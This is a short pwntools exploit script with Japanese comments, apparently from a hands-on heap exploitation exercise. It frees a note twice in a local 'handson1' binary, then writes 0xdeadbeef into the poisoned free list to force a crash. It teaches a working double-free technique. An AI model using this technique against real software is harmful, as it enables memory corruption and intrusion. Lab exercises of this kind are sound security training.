#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *
context.arch = 'amd64'


############## Utils #################
def menu():
  _  = s.readuntil('1: create note')
  _ += s.readuntil('2: delete note')
  _ += s.readuntil('3: exit')
  _ += s.readuntil('Command >> ')
  #print(_)
  return;

def create_note(size, data):
  s.sendline('1')
  s.sendlineafter('[*] Note data size:', str(size))
  s.sendlineafter('[*] Note data: ', data)
  idx = s.readline().strip().decode().split(':')[-1]
  idx = int(idx)
  return idx

  
def delete_note(idx):
  s.sendline('2')
  s.sendlineafter('[+] Note index: ', str(idx))
  return 
  

# docker exec -it handson bash --> ifconfigで適宜書き換える
HOST, PORT = '172.17.0.2', 1337 
#s = remote(HOST, PORT) # socat越しにExploitするときに使う
s = process("handson1")
menu()

A = create_note(0x10, b'A' * 0x0f)
tmp = create_note(0x10, b'dummy') # これは気にしない. 
## ここでdouble-freeを作る. 
delete_note(A)
delete_note(A)

## メモリに整数値を書き込むときはp64(0xdeadbeef)を使うと良いです. 
create_note(0x10, p64(0xdeadbeef) + b'\n')
create_note(0x10, b'JUNKJUNK\n')
input('GDB?')
create_note(0x10, b'SIGSEGV\n')
s.interactive()
